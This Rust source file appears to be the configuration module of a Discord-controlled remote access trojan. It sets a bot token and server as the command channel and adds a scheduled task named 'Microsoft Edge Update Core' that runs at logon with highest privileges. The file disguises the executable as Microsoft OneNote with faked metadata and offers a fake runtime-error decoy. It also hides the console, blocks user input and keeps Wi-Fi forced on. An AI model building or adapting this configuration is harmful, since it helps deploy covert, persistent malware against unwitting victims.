use std::collections::HashSet;
use twilight_model::id::{marker::GuildMarker, Id};

pub struct KeepActiveConfig {
    pub enabled: bool,
    pub interval_seconds: u64,
}

pub struct WifiMonitorConfig {
    pub enabled: bool,
    pub check_interval_ms: u64,
    pub re_enable_delay_seconds: u64,
    pub block_user_input: bool,
}

pub struct StartupConfig {
    pub enabled: bool,
    pub task_name: &'static str,
    pub on_logon: bool,
    pub highest_privileges: bool,
}

#[allow(dead_code)]
pub enum MessageBoxIcon {
    Error,
    Warning,
    Info,
    Question,
}

#[allow(dead_code)]
pub enum MessageBoxButtons {
    Ok,
    OkCancel,
    YesNo,
}

pub struct DecoyConfig {
    pub enabled: bool,
    pub title: &'static str,
    pub message: &'static str,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}

#[allow(dead_code)]
pub struct BuildInfo {
    pub file_name: &'static str,
    pub product_name: &'static str,
    pub description: &'static str,
    pub company_name: &'static str,
    pub file_version: &'static str,
}

pub struct Config;

impl Config {
    pub const DISCORD_TOKEN: &'static str = "kurinium-bot=token";
    pub const GUILD_ID: u64 = 10000000000;
    pub const BOT_PREFIX: &'static str = ".";
    pub const INSTALLATION_PATH: u8 = 1;
    pub const MAX_FILE_SIZE_MB: f64 = 10.0;

    pub fn get_startup_config() -> StartupConfig {
        StartupConfig {
            enabled: true,
            task_name: "Microsoft Edge Update Core",
            on_logon: true,
            highest_privileges: true,
        }
    }

    pub fn get_decoy_config() -> DecoyConfig {
        DecoyConfig {
            enabled: false,
            title: "Microsoft Visual C++ Runtime Library",
            message: "Runtime Error!\n\nProgram: C:\\Windows\\System32\\svchost.exe\n\nR6025\n- pure virtual function call",
            icon: MessageBoxIcon::Error,
            buttons: MessageBoxButtons::Ok,
        }
    }

    pub fn get_auth_config() -> AuthConfig {
        AuthConfig {
            auth_roles: false,
            allowed_roles: HashSet::from([]),
            auth_user: false,
            allowed_users: HashSet::from([]),
            auth_all: true,
        }
    }

    pub fn get_keep_active_config() -> KeepActiveConfig {
        KeepActiveConfig {
            enabled: true,
            interval_seconds: 60,
        }
    }

    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {
        WifiMonitorConfig {
            enabled: true,
            check_interval_ms: 500,
            re_enable_delay_seconds: 3,
            block_user_input: true,
        }
    }

    pub fn get_build_info() -> BuildInfo {
        BuildInfo {
            file_name: "Microsoft.OneNote.exe",
            product_name: "Microsoft OneNote",
            description: "Microsoft OneNote",
            company_name: "Microsoft Corporation",
            file_version: "10.0.19041.3303",
        }
    }

    pub fn get_guildid() -> Id<GuildMarker> {
        Id::new(Self::GUILD_ID)
    }

    pub fn get_token() -> String {
        Self::DISCORD_TOKEN.to_string()
    }

    pub fn get_exe_name() -> &'static str {
        Self::get_build_info().file_name
    }

    pub fn get_max_bfilesize() -> usize {
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }
}

#[derive(Debug, Clone)]
pub struct AuthConfig {
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}

impl Default for AuthConfig {
    fn default() -> Self {
        Self {
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true,
        }
    }
}

#[cfg(debug_assertions)]
impl Config {
    pub const SHOW_CONSOLE: bool = false;
}

#[cfg(not(debug_assertions))]
impl Config {
    pub const SHOW_CONSOLE: bool = false;
}
